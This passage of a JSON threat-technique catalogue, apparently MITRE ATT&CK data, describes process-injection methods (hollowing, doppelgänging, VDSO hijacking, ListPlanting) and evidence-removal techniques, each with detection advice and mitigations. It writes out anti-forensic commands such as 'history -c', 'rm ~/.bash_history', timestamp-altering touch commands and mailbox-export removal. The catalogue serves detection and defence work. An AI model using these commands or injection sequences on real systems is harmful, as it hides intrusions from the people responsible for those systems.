rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>","platforms":["Windows"],"dataSources":["Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.012","name":"Process Hollowing","description":"Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. Process hollowing is a method of executing arbitrary code in the address space of a separate live process.  \n\nProcess hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code. A victim process can be created with native Windows API calls such as <code>CreateProcess</code>, which includes a flag to suspend the processes primary thread. At this point the process can be unmapped using APIs calls such as <code>ZwUnmapViewOfSection</code> or <code>NtUnmapViewOfSection</code>  before being written to, realigned to the injected code, and resumed via <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, <code>SetThreadContext</code>, then <code>ResumeThread</code> respectively. <a href=\"http://www.autosectools.com/process-hollowing.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Leitch Hollowing)</a> <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nThis is very similar to Thread Local Storage but creates a new process rather than targeting an existing process. This behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process hollowing may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique. <a href=\"https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Elastic Process Injection July 2017)</a>\n\nProcessing hollowing commonly involves spawning an otherwise benign victim process. Consider correlating detections of processes created in a suspended state (ex: through API flags or process’ thread metadata) with other malicious activity such as attempts to modify a process' memory, especially by its parent process, or other abnormal process behavior. <a href=\"https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Nviso Spoof Command Line 2020)</a> <a href=\"https://www.mandiant.com/resources/staying-hidden-on-the-endpoint-evading-detection-with-shellcode\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant Endpoint Evading 2019)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Creation","Process: Process Modification","Process: OS API Execution","Process: Process Access"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.013","name":"Process Doppelgänging","description":"Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges. Process doppelgänging is a method of executing arbitrary code in the address space of a separate live process. \n\nWindows Transactional NTFS (TxF) was introduced in Vista as a method to perform safe file operations. <a href=\"https://msdn.microsoft.com/library/windows/desktop/bb968806.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft TxF)</a> To ensure data integrity, TxF enables only one transacted handle to write to a file at a given time. Until the write handle transaction is terminated, all other handles are isolated from the writer and may only read the committed version of the file that existed at the time the handle was opened. <a href=\"https://msdn.microsoft.com/library/windows/desktop/dd979526.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Basic TxF Concepts)</a> To avoid corruption, TxF performs an automatic rollback if the system or application fails during a write transaction. <a href=\"https://msdn.microsoft.com/library/windows/desktop/aa365738.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Where to use TxF)</a>\n\nAlthough deprecated, the TxF application programming interface (API) is still enabled as of Windows 10. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a>\n\nAdversaries may abuse TxF to a perform a file-less variation of Process Injection. Similar to Process Hollowing, process doppelgänging involves replacing the memory of a legitimate process, enabling the veiled execution of malicious code that may evade defenses and detection. Process doppelgänging's use of TxF also avoids the use of highly-monitored API functions such as <code>NtUnmapViewOfSection</code>, <code>VirtualProtectEx</code>, and <code>SetThreadContext</code>. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a>\n\nProcess Doppelgänging is implemented in 4 steps <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a>:\n\n* Transact – Create a TxF transaction using a legitimate executable then overwrite the file with malicious code. These changes will be isolated and only visible within the context of the transaction.\n* Load – Create a shared section of memory and load the malicious executable.\n* Rollback – Undo changes to original executable, effectively removing malicious code from the file system.\n* Animate – Create a process from the tainted section of memory and initiate execution.\n\nThis behavior will likely not result in elevated privileges since the injected process was spawned from (and thus inherits the security context) of the injecting process. However, execution via process doppelgänging may evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitor and analyze calls to <code>CreateTransaction</code>, <code>CreateFileTransacted</code>, <code>RollbackTransaction</code>, and other rarely used functions indicative of TxF activity. Process Doppelgänging also invokes an outdated and undocumented implementation of the Windows process loader via calls to <code>NtCreateProcessEx</code> and <code>NtCreateThreadEx</code> as well as API calls used to modify memory within another process, such as <code>WriteProcessMemory</code>. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a> <a href=\"https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hasherezade Process Doppelgänging Dec 2017)</a>\n\nScan file objects reported during the PsSetCreateProcessNotifyRoutine, <a href=\"https://msdn.microsoft.com/library/windows/hardware/ff559951.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PsSetCreateProcessNotifyRoutine routine)</a> which triggers a callback whenever a process is created or deleted, specifically looking for file objects with enabled write access. <a href=\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: BlackHat Process Doppelgänging Dec 2017)</a> Also consider comparing file objects loaded in memory to the corresponding file on disk. <a href=\"https://hshrzd.wordpress.com/2017/12/18/process-doppelganging-a-new-way-to-impersonate-a-process/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: hasherezade Process Doppelgänging Dec 2017)</a>\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["File: File Metadata","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.014","name":"VDSO Hijacking","description":"Adversaries may inject malicious code into processes via VDSO hijacking in order to evade process-based defenses as well as possibly elevate privileges. Virtual dynamic shared object (vdso) hijacking is a method of executing arbitrary code in the address space of a separate live process. \n\nVDSO hijacking involves redirecting calls to dynamically linked shared libraries. Memory protections may prevent writing executable code to a process via Ptrace System Calls. However, an adversary may hijack the syscall interface code stubs mapped into a process from the vdso shared object to execute syscalls to open and map a malicious shared object. This code can then be invoked by redirecting the execution flow of the process via patched memory address references stored in a process' global offset table (which store absolute addresses of mapped library functions). <a href=\"https://web.archive.org/web/20150711051625/http://vxer.org/lib/vrn00.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ELF Injection May 2009)</a> <a href=\"https://backtrace.io/blog/backtrace/elf-shared-library-injection-forensics/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Backtrace VDSO)</a> <a href=\"https://web.archive.org/web/20051013084246/http://www.trilithium.com/johan/2005/08/linux-gate/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: VDSO Aug 2005)</a> <a href=\"https://lwn.net/Articles/604515/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Syscall 2014)</a>\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via VDSO hijacking may also evade detection from security products since the execution is masked under a legitimate process.","detection":"Monitor for malicious usage of system calls, such as ptrace and mmap, that can be used to attach to, manipulate memory, then redirect a processes' execution path. Monitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods. <em>The Art of Memory Forensics: Detecting Malware and Threats in Windows, Linux, and Mac Memory</em> (Ligh et al., Wiley, 2014) <a href=\"https://www.gnu.org/software/acct/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GNU Acct)</a> <a href=\"https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/chap-system_auditing\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: RHEL auditd)</a> <a href=\"http://www.chokepoint.net/2014/02/detecting-userland-preload-rootkits.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Chokepoint preload rootkits)</a> \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Linux"],"dataSources":["Process: OS API Execution","Module: Module Load"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]},{"id":"T1055.015","name":"ListPlanting","description":"Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges. ListPlanting is a method of executing arbitrary code in the address space of a separate live process. <a href=\"https://www.hexacorn.com/blog/2019/04/25/listplanting-yet-another-code-injection-trick/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Hexacorn Listplanting)</a> Code executed via ListPlanting may also evade detection from security products since the execution is masked under a legitimate process.\n\nList-view controls are user interface windows used to display collections of items. <a href=\"https://docs.microsoft.com/windows/win32/controls/list-view-controls-overview\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft List View Controls)</a> Information about an application's list-view settings are stored within the process' memory in a <code>SysListView32</code> control.\n\nListPlanting (a form of message-passing \"shatter attack\") may be performed by copying code into the virtual address space of a process that uses a list-view control then using that code as a custom callback for sorting the listed items. <a href=\"https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Modexp Windows Process Injection)</a> Adversaries must first copy code into the target process’ memory space, which can be performed various ways including by directly obtaining a handle to the <code>SysListView32</code> child of the victim process window (via Windows API calls such as <code>FindWindow</code> and/or <code>EnumWindows</code>) or other Process Injection methods.\n\nSome variations of ListPlanting may allocate memory in the target process but then use window messages to copy the payload, to avoid the use of the highly monitored <code>WriteProcessMemory</code> function. For example, an adversary can use the <code>PostMessage</code> and/or <code>SendMessage</code> API functions to send <code>LVM_SETITEMPOSITION</code> and <code>LVM_GETITEMPOSITION</code> messages, effectively copying a payload 2 bytes at a time to the allocated memory. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2020/06/ESET_InvisiMole.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET InvisiMole June 2020)</a> \n\nFinally, the payload is triggered by sending the <code>LVM_SORTITEMS</code> message to the <code>SysListView32</code> child of the process window, with the payload within the newly allocated buffer passed and executed as the <code>ListView_SortItems</code> callback.","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>FindWindow</code>, <code>FindWindowEx</code>, <code>EnumWindows</code>, <code>EnumChildWindows</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be abused for this technique. \n\nConsider monitoring for excessive use of <code>SendMessage</code> and/or <code>PostMessage</code> API functions with <code>LVM_SETITEMPOSITION</code> and/or <code>LVM_GETITEMPOSITION</code> arguments.\n\nAnalyze process behavior to determine if a process is performing unusual actions, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior.","platforms":["Windows"],"dataSources":["Process: Process Modification","Process: OS API Execution"],"mitigations":[{"id":"M1040","name":"Behavior Prevention on Endpoint","description":"Some endpoint security solutions can be configured to block some types of process injection based on common sequences of behavior that occur during the injection process."}]}]},{"id":"T1070","name":"Indicator Removal","description":"Adversaries may selectively delete or modify artifacts generated to reduce indications of their presence and blend in with legitimate activity. Rather than broadly removing evidence, adversaries may target specific artifacts that appear anomalous or are likely to draw scrutiny, while leaving sufficient data intact to maintain the appearance of normal system behavior.\n\nArtifacts such as command histories, log entries, or file metadata may be altered in ways that align with expected user or system activity. Location, format, and type of artifact (such as command or login history) are often platform-specific, allowing adversaries to tailor modifications that minimize suspicion.\n\nThese actions may not prevent detection entirely but can delay recognition of malicious activity or reduce the fidelity of alerts by making events appear benign or consistent with routine operations. Additionally, selectively removed or modified artifacts may still be recoverable through deeper forensic analysis, though their absence or alteration can complicate timeline reconstruction and attribution.","detection":"File system monitoring may be used to detect improper deletion or modification of indicator files.  Events not stored on the file system may require different detection mechanisms.","platforms":["Containers","ESXi","Linux","macOS","Network Devices","Office Suite","Windows"],"dataSources":["Scheduled Job: Scheduled Job Modification","File: File Modification","Firewall: Firewall Rule Modification","User Account: User Account Authentication","File: File Metadata","User Account: User Account Deletion","Process: OS API Execution","Application Log: Application Log Content","Command: Command Execution","File: File Deletion","Process: Process Creation","Windows Registry: Windows Registry Key Modification","Network Traffic: Network Traffic Content","Windows Registry: Windows Registry Key Deletion"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."},{"id":"M1029","name":"Remote Data Storage","description":"Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Obfuscate/encrypt event files locally and in transit to avoid giving feedback to an adversary."}],"subTechniques":[{"id":"T1070.003","name":"Clear Command History","description":"In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.\n\nOn Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>.  \n\nAdversaries may also leverage a Network Device CLI on network devices to clear command history data (<code>clear logging</code> and/or <code>clear history</code>). <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> On ESXi servers, command history may be manually removed from the <code>/var/log/shell.log</code> file. <a href=\"https://knowledge.broadcom.com/external/article/321910/auditing-esxi-shell-logins-and-commands.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Broadcom ESXi Shell Audit)</a>\n\nOn Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends.\n\nThe <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends. <a href=\"https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_history?view=powershell-7\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft PowerShell Command History)</a>\n\nAdversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history from a current PowerShell session. This, however, will not delete/flush the <code>ConsoleHost_history.txt</code> file. Adversaries may also delete the <code>ConsoleHost_history.txt</code> file or edit its contents to hide PowerShell commands they have run. <a href=\"https://community.sophos.com/products/intercept/early-access-program/f/live-discover-response-queries/121529/live-discover---powershell-command-audit\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos PowerShell command audit)</a> <a href=\"https://community.sophos.com/products/malware/b/blog/posts/powershell-command-history-forensics\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sophos PowerShell Command History Forensics)</a>","detection":"User authentication, especially via remote terminal services like SSH, without new entries in that user's <code>~/.bash_history</code> is suspicious. Additionally, the removal/clearing of the <code>~/.bash_history</code> file can be an indicator of suspicious activity.\n\nMonitor for suspicious modifications or deletion of <code>ConsoleHost_history.txt</code> and use of the <code>Clear-History</code> command.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: Process Creation","File: File Deletion","File: File Modification","Command: Command Execution","User Account: User Account Authentication"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Preventing users from deleting or writing to certain files can stop adversaries from maliciously altering their <code>~/.bash_history</code> or <code>ConsoleHost_history.txt</code> files."},{"id":"M1029","name":"Remote Data Storage","description":"Forward logging of historical data to remote data store and centralized logging solution to preserve historical command line log data."},{"id":"M1039","name":"Environment Variable Permissions","description":"Making the environment variables associated with command history read only may ensure that the history is preserved. <a href=\"http://www.akyl.net/securing-bashhistory-file-make-sure-your-linux-system-users-won%E2%80%99t-hide-or-delete-their-bashhistory\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Securing bash history)</a>"}]},{"id":"T1070.004","name":"File Deletion","description":"Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: Ingress Tool Transfer) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. <a href=\"https://docs.microsoft.com/en-us/sysinternals/downloads/sdelete\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft SDelete July 2016)</a> Examples of built-in Command and Scripting Interpreter functions include <code>del</code> on Windows, <code>rm</code> or <code>unlink</code> on Linux and macOS, and <code>rm</code> on ESXi.","detection":"It may be uncommon for events related to benign command-line functions such as DEL or third-party utilities or tools to be found in an environment, depending on the user base and how systems are typically used. Monitoring for command-line deletion functions to correlate with binaries or other files that an adversary may drop and remove may lead to detection of malicious activity. Another good practice is monitoring for known deletion and secure deletion tools that are not already on systems within an enterprise network that an adversary could introduce. Some monitoring tools may collect command-line arguments, but may not capture DEL commands since DEL is a native function within cmd.exe.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Command: Command Execution","File: File Deletion"],"mitigations":[]},{"id":"T1070.005","name":"Network Share Connection Removal","description":"Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation. Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed. Net is an example utility that can be used to remove network share connections with the <code>net use \\\\system\\share /delete</code> command. <a href=\"https://technet.microsoft.com/bb490717.aspx\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Technet Net Use)</a>","detection":"Network share connections may be common depending on how an network environment is used. Monitor command-line invocation of <code>net use</code> commands associated with establishing and removing remote shares over SMB, including following best practices for detection of Windows Admin Shares. SMB traffic between systems may also be captured and decoded to look for related network share session and file transfer activity. Windows authentication logs are also useful in determining when authenticated network shares are established and by which account, and can be used to correlate network share activity to other events to investigate potentially malicious activity.","platforms":["Windows"],"dataSources":["Network Traffic: Network Traffic Content","Command: Command Execution","Process: Process Creation","User Account: User Account Authentication"],"mitigations":[]},{"id":"T1070.006","name":"Timestomp","description":"Adversaries may modify file time attributes to hide new files or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder and blend malicious files with legitimate files.\n\nIn Windows systems, both the <code>$STANDARD_INFORMATION</code> (<code>$SI</code>) and <code>$FILE_NAME</code> (<code>$FN</code>) attributes record times in a Master File Table (MFT) file. <a href=\"https://www.inversecos.com/2022/04/defence-evasion-technique-timestomping.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Inversecos Timestomping 2022)</a> <code>$SI</code> (dates/time stamps) is displayed to the end user, including in the File System view, while <code>$FN</code> is dealt with by the kernel. <a href=\"https://www.magnetforensics.com/blog/expose-evidence-of-timestomping-with-the-ntfs-timestamp-mismatch-artifact-in-magnet-axiom-4-4/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Magnet Forensics)</a>\n\nModifying the <code>$SI</code> attribute is the most common method of timestomping because it can be modified at the user level using API calls. <code>$FN</code> timestomping, however, typically requires interacting with the system kernel or moving or renaming a file. <a href=\"https://www.inversecos.com/2022/04/defence-evasion-technique-timestomping.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Inversecos Timestomping 2022)</a>\n\nAdversaries modify timestamps on files so that they do not appear conspicuous to forensic investigators or file analysis tools. In order to evade detections that rely on identifying discrepancies between the <code>$SI</code> and <code>$FN</code> attributes, adversaries may also engage in “double timestomping” by modifying times on both attributes simultaneously. <a href=\"https://x.com/matthewdunwoody/status/1519846657646604289\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Double Timestomping)</a>\n\nIn Linux systems and on ESXi servers, threat actors may attempt to perform timestomping using commands such as <code>touch -a -m -t &lt;timestamp&gt; &lt;filename&gt;</code> (which sets access and modification times to a specific value) or <code>touch -r &lt;filename&gt; &lt;filename&gt;</code> (which sets access and modification times to match those of another file). <a href=\"https://www.inversecos.com/2022/08/detecting-linux-anti-forensics.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Inversecos Linux Timestomping)</a> <a href=\"https://blogs.juniper.net/en-us/threat-research/a-custom-python-backdoor-for-vmware-esxi-servers\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Juniper Networks ESXi Backdoor 2022)</a>\n\nTimestomping may be used along with file name Masquerading to hide malware and tools. <a href=\"http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WindowsIR Anti-Forensic Techniques)</a>","detection":"Forensic techniques exist to detect aspects of files that have had their timestamps modified. <a href=\"http://windowsir.blogspot.com/2013/07/howto-determinedetect-use-of-anti.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: WindowsIR Anti-Forensic Techniques)</a> It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Process: OS API Execution","File: File Modification","File: File Metadata","Command: Command Execution"],"mitigations":[]},{"id":"T1070.007","name":"Clear Network Connection History and Configurations","description":"Adversaries may clear or remove evidence of malicious network connections in order to clean up traces of their operations. Configuration settings as well as various artifacts that highlight connection history may be created on a system and/or in application logs from behaviors that require network connections, such as Remote Services or External Remote Services. Defenders may use these artifacts to monitor or otherwise analyze network connections created by adversaries.\n\nNetwork connection history may be stored in various locations. For example, RDP connection history may be stored in Windows Registry values under <a href=\"https://docs.microsoft.com/troubleshoot/windows-server/remote/remove-entries-from-remote-desktop-connection-computer\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft RDP Removal)</a>:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Servers</code>\n\nWindows may also store information about recent RDP connections in files such as <code>C:\\Users\\\\%username%\\Documents\\Default.rdp</code> and <code>C:\\Users\\%username%\\AppData\\Local\\Microsoft\\Terminal\nServer Client\\Cache\\</code>. <a href=\"https://www.osdfcon.org/presentations/2020/Brian-Moran_Putting-Together-the-RDPieces.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Moran RDPieces)</a> Similarly, macOS and Linux hosts may store information highlighting connection history in system logs (such as those stored in <code>/Library/Logs</code> and/or <code>/var/log/</code>). <a href=\"https://discussions.apple.com/thread/3991574\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Culprit Access)</a> <a href=\"https://www.freedesktop.org/software/systemd/man/systemd-journald.service.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FreeDesktop Journal)</a> <a href=\"https://sarah-edwards-xzkc.squarespace.com/blog/2020/4/30/analysis-of-apple-unified-logs-quarantine-edition-entry-6-working-from-home-remote-logins\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Apple Unified Log Analysis Remote Login and Screen Sharing)</a>\n\nMalicious network connections may also require changes to third-party applications or network configuration settings, such as Disable or Modify System Firewall or tampering to enable Proxy. Adversaries may delete or modify this data to conceal indicators and/or impede defensive analysis.","detection":"","platforms":["Linux","macOS","Windows","Network Devices"],"dataSources":["Process: Process Creation","Windows Registry: Windows Registry Key Modification","Command: Command Execution","Firewall: Firewall Rule Modification","File: File Modification"],"mitigations":[{"id":"M1024","name":"Restrict Registry Permissions","description":"Protect generated event files and logs that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."},{"id":"M1029","name":"Remote Data Storage","description":"Automatically forward events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."}]},{"id":"T1070.008","name":"Clear Mailbox Data","description":"Adversaries may modify mail and mail application data to remove evidence of their activity. Email applications allow users and other programs to export and delete mailbox data via command line tools or use of APIs. Mail application data can be emails, email metadata, or logs generated by the application or operating system, such as export requests. \n\nAdversaries may manipulate emails and mailbox data to remove logs, artifacts, and metadata, such as evidence of Phishing/Internal Spearphishing, Email Collection, Mail Protocols for command and control, or email-based exfiltration such as Exfiltration Over Alternative Protocol. For example, to remove evidence on Exchange servers adversaries have used the <code>ExchangePowerShell</code> PowerShell module, including <code>Remove-MailboxExportRequest</code> to remove evidence of mailbox exports. <a href=\"https://www.volexity.com/blog/2020/12/14/dark-halo-leverages-solarwinds-compromise-to-breach-organizations/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Volexity SolarWinds)</a> <a href=\"https://docs.microsoft.com/en-us/powershell/module/exchange/?view=exchange-ps#mailboxes\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ExchangePowerShell Module)</a> On Linux and macOS, adversaries may also delete emails through a command line utility called <code>mail</code>  or use AppleScript to interact with APIs on macOS. <a href=\"https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason Cobalt Kitty 2017)</a> <a href=\"https://man7.org/linux/man-pages/man1/mailx.1p.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: mailx man page)</a>\n\nAdversaries may also remove emails and metadata/headers indicative of spam or suspicious activity (for example, through the use of organization-wide transport rules) to reduce the likelihood of malicious emails being detected by security products. <a href=\"https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft OAuth Spam 2022)</a>","detection":"","platforms":["Linux","macOS","Office Suite","Windows"],"dataSources":["Application Log: Application Log Content","File: File Deletion","File: File Modification","Command: Command Execution","Process: Process Creation"],"mitigations":[{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Protect generated event files that are stored locally with proper permissions and authentication and limit opportunities for adversaries to increase privileges by preventing Privilege Escalation opportunities."},{"id":"M1029","name":"Remote Data Storage","description":"Automatically forward mail data and events to a log server or data repository to prevent conditions in which the adversary can locate and manipulate data on the local system. When possible, minimize time delay on event reporting to avoid prolonged storage on the local system."},{"id":"M1047","name":"Audit","description":"In an Exchange environment, Administrators can use <code>Get-TransportRule</code> / <code>Remove-TransportRule</code> to discover and remove potentially malicious transport rules. <a href=\"https://learn.microsoft.com/en-us/exchange/security-and-compliance/mail-flow-rules/manage-mail-flow-rules\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Microsoft Manage Mail Flow Rules 2023)</a>"}]},{"id":"T1070.009","name":"Clear Persistence","description":"Adversaries may clear artifacts associated with previously established persistence on a host system to remove evidence of their activity. This may involve various actions, such as removing services, deleting executables, Modify Registry, Plist File Modification, or other methods of cleanup to prevent defenders from collecting evidence of their persistent presence. <a 